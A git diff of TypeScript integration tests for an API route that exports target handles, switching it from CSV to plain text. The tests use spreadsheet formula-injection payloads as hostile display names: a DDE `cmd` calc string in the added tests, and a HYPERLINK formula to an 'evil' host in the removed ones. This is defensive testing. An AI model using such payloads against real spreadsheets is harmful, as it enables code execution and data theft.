@@ -1,21 +1,28 @@
 /**
- * GET /api/personalities/:id/targets.csv -- the first route in the product that
- * answers with a file rather than JSON, and the first one that hands the
- * operator data to open in another program.
+ * GET /api/personalities/:id/targets.txt -- the one route in the product that
+ * answers with a file rather than JSON.
  *
- * Three things are asserted here and only the first is about CSV.
+ * It was `.csv`, and this file went on testing `.csv` long after the route
+ * stopped existing: the export was deliberately changed to one handle per line,
+ * because eight columns is the right shape for a spreadsheet and the wrong one
+ * for feeding handles back into a machine, which is what this export is for.
+ * Twelve tests here were asserting against 404s. Two of them PASSED while doing
+ * it -- both expected a 404, and got one because nothing was served at all.
  *
- * The escaping, end to end. src/common/csv.spec.ts proves the formatter; this
- * proves the formatter is actually what the route uses, on a display name that
- * arrived from a vision model reading somebody's profile. The failure it looks
- * for opens cleanly in Excel and is silently wrong -- or, in the formula case,
- * is not data at all.
+ * Three things are asserted, and only the first has changed with the format.
  *
- * The tenant line. Every other read in the estate is scoped through clientId
- * and this one has to be too, doubly so: it is not a page of the ledger, it is
- * the whole ledger in one response, and the ledger is real people's handles.
- * /api/* shipped once with no guard at all, so the scoping is checked here on
- * the route rather than assumed from the neighbours.
+ * The format, end to end. One handle per line and nothing else: no header, no
+ * quoting, and above all no BOM, which would arrive as an invisible character on
+ * the front of the first handle and make that one handle match nobody. The CSV
+ * escaping tests are gone with the CSV -- src/common/csv.spec.ts still proves
+ * the formatter -- and what replaces them is the stronger claim this format
+ * allows: a display name cannot reach the file at all.
+ *
+ * The tenant line. Every other read in the estate is scoped through clientId and
+ * this one has to be too, doubly so: it is not a page of the ledger, it is the
+ * whole ledger in one response, and the ledger is real people's handles. /api/*
+ * shipped once with no guard at all, so the scoping is checked on the route
+ * rather than assumed from the neighbours.
  *
  * And that a refusal is a refusal. The ownership check and the state validation
  * run before the first byte, because a 404 raised after the headers are out can
@@ -70,163 +77,112 @@ async function addFollowed(c: Ctx, handle: string, displayName: string): Promise
   });
 }
 
-/** Data records, header and trailing blank dropped. Records, not lines: a
- *  display name may legally contain its own newline inside quotes. */
-function records(csv: string): string[] {
-  return csv
-    .replace(/^﻿/, '')
-    .split('\r\n')
-    .slice(1)
-    .filter((r) => r.length > 0);
+/** The handles in the file. Lines, plainly -- there is nothing to parse, which
+ *  is the point of the format. The trailing newline leaves a final empty entry. */
+function handles(txt: string): string[] {
+  return txt.split('\n').filter((line) => line.length > 0);
 }
 
 describe('the file itself', () => {
-  it('answers as a CSV attachment named after the personality and the filter', async () => {
+  it('answers as a text attachment named after the personality and the filter', async () => {
     const c = await ctx();
     await addFollowed(c, 'plainone', 'Plain One');
 
-    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
+    const res = await api.get(`/api/personalities/${c.personalityId}/targets.txt?state=followed`, {
       auth: c.auth,
     });
 
     expect(res.status).toBe(200);
-    expect(res.headers.get('content-type')).toContain('text/csv');
+    expect(res.headers.get('content-type')).toContain('text/plain');
     const disposition = res.headers.get('content-disposition') ?? '';
     expect(disposition).toContain('attachment');
-    expect(disposition).toContain('-followed.csv');
+    // The filter is in the filename because these files are the unit of exchange
+    // between two systems: a folder of them all called "kris.txt" is unusable.
+    expect(disposition).toContain('-followed.txt');
   });
 
-  it('leads with the BOM and a header row', async () => {
+  it('writes one handle per line, with no header and no BOM', async () => {
     const c = await ctx();
-    await addFollowed(c, 'headers', 'Headers');
+    await addFollowed(c, 'firsthandle', 'First Handle');
 
-    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv`, {
+    const res = await api.get(`/api/personalities/${c.personalityId}/targets.txt`, {
       auth: c.auth,
     });
 
-    // Without the BOM Excel reads UTF-8 as the local codepage and every accent
-    // in a display name becomes mojibake in a file that otherwise looks fine.
-    expect(res.text.startsWith('﻿')).toBe(true);
-    expect(res.text.split('\r\n')[0]).toBe(
-      '﻿handle,display name,nationality,source,state,account,handed out at,followed at',
-    );
-  });
-
-  it('reports handle, nationality, account and when the follow landed', async () => {
-    const c = await ctx();
-    await addFollowed(c, 'fullrow', 'Full Row');
-
-    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
-      auth: c.auth,
-    });
-
-    expect(records(res.text)).toEqual([
-      `fullrow,Full Row,italian,extraction,followed,${c.client.personality.accounts[0].label},` +
-        '2026-08-13T10:00:00.000Z,2026-08-13T10:02:00.000Z',
-    ]);
+    // The BOM is the one that matters. It is invisible, it survives a copy and
+    // paste, and it would make the FIRST handle of every file -- and only the
+    // first -- match nobody on import.
+    expect(res.text.startsWith('﻿')).toBe(false);
+    expect(res.text).toBe('firsthandle\n');
   });
 
   it('honours ?state=, so the followed list exports only the followed', async () => {
     const c = await ctx();
-    await addFollowed(c, 'wasfollowed', 'Was Followed');
-    await queueTargets(c.personalityId, c.accountId, 3, 'stillqueued');
+    await addFollowed(c, 'didfollow', 'Did Follow');
+    await queueTargets(c.personalityId, c.accountId, 1, 'stillqueued');
 
-    const followed = await api.get(
-      `/api/personalities/${c.personalityId}/targets.csv?state=followed`,
-      { auth: c.auth },
-    );
-    const everyone = await api.get(`/api/personalities/${c.personalityId}/targets.csv`, {
+    const res = await api.get(`/api/personalities/${c.personalityId}/targets.txt?state=followed`, {
       auth: c.auth,
     });
 
-    expect(records(followed.text)).toHaveLength(1);
-    expect(followed.text).toContain('wasfollowed');
-    expect(followed.text).not.toContain('stillqueued');
-    expect(records(everyone.text)).toHaveLength(4);
+    expect(handles(res.text)).toEqual(['didfollow']);
   });
 
-  it('writes a header row and nothing else when nothing matches', async () => {
+  it('writes nothing at all when nothing matches', async () => {
     const c = await ctx();
-    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
+
+    const res = await api.get(`/api/personalities/${c.personalityId}/targets.txt?state=followed`, {
       auth: c.auth,
     });
+
     expect(res.status).toBe(200);
-    expect(records(res.text)).toEqual([]);
+    // Empty, and not a lone header line: the import reads every line as a
+    // handle, so a file with one line in it is a file with one bad handle in it.
+    expect(res.text).toBe('');
   });
 
-  /**
-   * The export walks in batches internally. One batch is 1000 rows, so this is
-   * a cheap check that the loop terminates and does not repeat or drop rows at
-   * a boundary -- the exhaustiveness of the cursor itself is proved over 250
-   * tied rows in pagination.int.spec.ts.
-   */
   it('exports every row, not the first page of them', async () => {
     const c = await ctx();
-    const handles = await queueTargets(c.personalityId, c.accountId, 120, 'walked');
+    const queued = await queueTargets(c.personalityId, c.accountId, 120, 'walked');
 
-    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv`, {
+    const res = await api.get(`/api/personalities/${c.personalityId}/targets.txt`, {
       auth: c.auth,
     });
 
-    const written = records(res.text).map((r) => r.split(',')[0]);
+    const written = handles(res.text);
     expect(written).toHaveLength(120);
     expect(new Set(written).size).toBe(120);
-    expect([...written].sort()).toEqual([...handles].sort());
+    expect([...written].sort()).toEqual([...queued].sort());
   });
 });
 
-describe('display names are hostile input', () => {
-  it('keeps a name containing a comma and a quote inside one cell', async () => {
+describe('a display name cannot reach the file', () => {
+  /**
+   * What replaced the CSV escaping tests, and a stronger claim than they made.
+   *
+   * A display name arrives from a vision model reading a stranger's profile: it
+   * is attacker-influenced text. The CSV carried it and had to escape it
+   * correctly every single time; this format never carries it, so the whole
+   * class of "opens cleanly in Excel and is silently wrong" is gone rather than
+   * handled.
+   */
+  it('carries the handle and none of the name, however hostile the name is', async () => {
     const c = await ctx();
-    await addFollowed(c, 'commaquote', 'Smith, "JJ" Jr');
+    await addFollowed(c, 'hostileone', "=cmd|'/c calc'!A1");
+    await addFollowed(c, 'hostiletwo', 'Smith, "JJ"\nSecond Line');
+    await addFollowed(c, 'hostilethree', 'Zoë 🌸');
 
-    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
+    const res = await api.get(`/api/personalities/${c.personalityId}/targets.txt`, {
       auth: c.auth,
     });
 
-    const [row] = records(res.text);
-    expect(row).toContain('"Smith, ""JJ"" Jr"');
-    // The failure this exists for: the name shifts every later column, so the
-    // account label lands under nationality and the file still opens cleanly.
-    expect(row.endsWith('2026-08-13T10:02:00.000Z')).toBe(true);
-  });
-
-  it('keeps a name containing a newline from ending the record', async () => {
-    const c = await ctx();
-    await addFollowed(c, 'multiline', 'Two\nLines');
-
-    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
-      auth: c.auth,
-    });
-
-    expect(res.text).toContain('"Two\nLines"');
-    // Split on CRLF, which only appears between records: one row, not two.
-    expect(records(res.text)).toHaveLength(1);
-  });
-
-  it('neutralises a name that a spreadsheet would execute', async () => {
-    const c = await ctx();
-    await addFollowed(c, 'formula', '=HYPERLINK("http://evil/?"&A1,"open")');
-
-    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
-      auth: c.auth,
-    });
-
-    const [row] = records(res.text);
-    // Present and readable -- the operator is exporting real people and a
-    // mangled name is one they cannot find again -- but no longer the first
-    // character the spreadsheet parses, so it is never evaluated.
-    expect(row).toContain('=HYPERLINK');
-    expect(row).toContain(`"'=HYPERLINK`);
-  });
-
-  it('carries emoji and accents through intact', async () => {
-    const c = await ctx();
-    await addFollowed(c, 'accented', 'Zoë 🌸');
-    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=followed`, {
-      auth: c.auth,
-    });
-    expect(res.text).toContain('Zoë 🌸');
+    expect(handles(res.text).sort()).toEqual(['hostileone', 'hostilethree', 'hostiletwo']);
+    for (const fragment of ['cmd', 'calc', 'Smith', 'Second Line', 'Zoë', '🌸']) {
+      expect(res.text).not.toContain(fragment);
+    }
+    // And the newline inside that second name did not become a record boundary,
+    // which is the failure the CSV version of this test existed to catch.
+    expect(handles(res.text)).toHaveLength(3);
   });
 });
 
@@ -234,35 +190,34 @@ describe('the tenant line', () => {
   it('404s on another tenant`s personality and writes no rows', async () => {
     const a = await ctx();
     const b = await ctx();
-    const handles = await queueTargets(b.personalityId, b.accountId, 4, 'bsecret');
+    const secret = await queueTargets(b.personalityId, b.accountId, 4, 'bsecret');
 
-    const res = await api.get(`/api/personalities/${b.personalityId}/targets.csv`, {
+    const res = await api.get(`/api/personalities/${b.personalityId}/targets.txt`, {
       auth: a.auth,
     });
 
     expect(res.status).toBe(404);
     // A 404 whose body still carried the handles would be the same breach with
     // a different status code -- and this route's body is the whole ledger.
-    for (const handle of handles) expect(res.text).not.toContain(handle);
-    expect(res.headers.get('content-type')).not.toContain('text/csv');
+    for (const handle of secret) expect(res.text).not.toContain(handle);
+    expect(res.headers.get('content-type')).not.toContain('text/plain');
   });
 
   it('exports only the caller`s own rows when both tenants hold the same handle', async () => {
     const a = await ctx();
     const b = await ctx();
     // The same handle under two clients is two unrelated Snapchat accounts, and
-    // both ledgers may legitimately hold it -- so identical handles are the
-    // case where a missing clientId scope is hardest to see.
+    // both ledgers may legitimately hold it -- so identical handles are the case
+    // where a missing clientId scope is hardest to see. Which is why this one
+    // checks the COUNT: the handle itself cannot tell the two apart.
     await addFollowed(a, 'shared_handle', 'Belongs To A');
     await addFollowed(b, 'shared_handle', 'Belongs To B');
 
-    const res = await api.get(`/api/personalities/${a.personalityId}/targets.csv`, {
+    const res = await api.get(`/api/personalities/${a.personalityId}/targets.txt`, {
       auth: a.auth,
     });
 
-    expect(records(res.text)).toHaveLength(1);
-    expect(res.text).toContain('Belongs To A');
-    expect(res.text).not.toContain('Belongs To B');
+    expect(handles(res.text)).toEqual(['shared_handle']);
   });
 });
 
@@ -270,7 +225,7 @@ describe('refusals arrive before the first byte', () => {
   it('rejects an unknown state as JSON, not as a truncated file', async () => {
     const c = await ctx();
 
-    const res = await api.get(`/api/personalities/${c.personalityId}/targets.csv?state=folowed`, {
+    const res = await api.get(`/api/personalities/${c.personalityId}/targets.txt?state=folowed`, {
       auth: c.auth,
     });
 
@@ -283,7 +238,7 @@ describe('refusals arrive before the first byte', () => {
   it('404s on a personality that does not exist', async () => {
     const c = await ctx();
     const res = await api.get(
-      '/api/personalities/00000000-0000-4000-8000-0000000000ff/targets.csv',
+      '/api/personalities/00000000-0000-4000-8000-0000000000ff/targets.txt',
       { auth: c.auth },
     );
     expect(res.status).toBe(404);
